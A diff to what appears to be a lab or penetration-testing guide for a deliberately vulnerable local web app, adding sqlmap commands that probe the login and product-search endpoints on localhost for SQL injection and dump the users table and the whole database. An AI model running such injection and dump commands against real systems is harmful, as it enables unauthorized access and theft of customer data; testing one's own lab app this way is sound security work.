@@ -203,15 +203,34 @@ sqlmap -r login-request.txt -D main -T users --dump
 sqlmap -r login-request.txt --dump-all
 ```
 
-**Alternative: Direct URL Testing**
+**Alternative: Direct URL Testing (for JSON API)**
+
+⚠️ **Important**: The login endpoint expects JSON, not form-encoded data:
+
 ```bash
-# Test login endpoint directly
+# Test login endpoint with JSON payload
 sqlmap -u "http://localhost:5000/api/login" \
-  --data="username=admin&password=test" \
+  --data='{"username":"admin","password":"test"}' \
+  --headers="Content-Type: application/json" \
   --batch --risk=3 --level=5
 
-# Test product search (also vulnerable)
+# Test product search (also vulnerable, simpler GET endpoint)
 sqlmap -u "http://localhost:5000/api/products/search?query=tomato" \
+  --batch --risk=3 --level=5
+```
+
+**Troubleshooting if SQLmap doesn't detect the vulnerability:**
+```bash
+# Add verbose output to see what's happening
+sqlmap -u "http://localhost:5000/api/login" \
+  --data='{"username":"admin","password":"test"}' \
+  --headers="Content-Type: application/json" \
+  -v 3
+
+# If still not working, try with wildcards for parameter detection
+sqlmap -u "http://localhost:5000/api/login" \
+  --data='{"username":"admin*","password":"test"}' \
+  --headers="Content-Type: application/json" \
   --batch --risk=3 --level=5
 ```
 
@@ -618,9 +637,13 @@ brew install sqlmap      # macOS
 
 **Manchester Fresh Foods Specific Commands:**
 
-**Test 1: Login Form SQL Injection**
+**Test 1: Login Form SQL Injection (Two Methods)**
+
+**Method A: Using Burp Suite Request File** (most reliable)
 ```bash
-# Save login request from Burp Suite to login-request.txt, then:
+# 1. In Burp Suite, right-click the POST /api/login request
+# 2. Select "Copy to file" and save as login-request.txt
+# 3. Run SQLmap against the saved request:
 
 # Detect SQL injection
 sqlmap -r login-request.txt --batch --dbms=SQLite
@@ -636,6 +659,21 @@ sqlmap -r login-request.txt -T users --dump --dbms=SQLite
 
 # Dump ALL data (orders, products, customers)
 sqlmap -r login-request.txt --dump-all --dbms=SQLite --exclude-sysdbs
+```
+
+**Method B: Direct URL with JSON** (if Burp unavailable)
+```bash
+# For API endpoints that expect JSON:
+sqlmap -u "http://localhost:5000/api/login" \
+  --data='{"username":"admin","password":"test"}' \
+  --headers="Content-Type: application/json" \
+  --batch --dbms=SQLite
+
+# If SQLmap needs help finding the parameter, add a marker:
+sqlmap -u "http://localhost:5000/api/login" \
+  --data='{"username":"admin*","password":"test"}' \
+  --headers="Content-Type: application/json" \
+  --dbms=SQLite
 ```
 
 **Test 2: Product Search SQL Injection**
